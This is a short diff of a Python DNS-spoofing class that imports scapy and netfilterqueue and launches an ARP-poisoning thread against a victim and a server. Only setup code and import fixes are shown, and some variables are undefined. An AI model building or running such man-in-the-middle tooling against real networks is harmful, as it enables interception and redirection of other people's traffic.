@@ -1,17 +1,16 @@
 from typing import Any
-from NetfilterQueue import NetFilterQueue
+from netfilterqueue import NetfilterQueue
 import os
 import ArpPoison
 import threading
-from scapy.all import IP, UDP, NDS, DNSRR, DNSQR, Ether
+from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, Ether
 
 class Dns_spoof:
 
     def __init__(self, queue_num, ipVictim, ipServer, host) -> None:
-        print('in init')
         self.queue_num = 1
         self.pktCounter = 0
-
+        
     def __call__(self) -> None:
         print('in call')
         arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
